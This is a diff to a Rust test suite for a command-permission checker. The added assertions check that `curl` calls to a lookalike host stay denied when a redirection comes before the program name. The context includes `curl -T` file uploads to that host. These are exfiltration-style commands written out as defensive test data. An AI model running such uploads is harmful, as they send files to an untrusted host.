@@ -824,6 +824,10 @@ fn a_redirection_does_not_move_an_upload_option_away_from_its_file() {
     ] {
         assert_denied(&repo, &format!("curl -T {redirection} {LOOKALIKE} {out}"));
     }
+    // ahead of the program too: the accepted rule is any `<` or `>` before
+    // the address
+    assert_denied(&repo, &format!("2>/dev/null curl {LOOKALIKE}"));
+    assert_denied(&repo, &format!("> out.txt curl -sS {LOOKALIKE}"));
     // a quoted `>` is an ordinary word, and what follows it is still read
     assert_denied(&repo, &format!("curl '>' -T {LOOKALIKE} {out}"));
     // a redirection after the address changes nothing about it
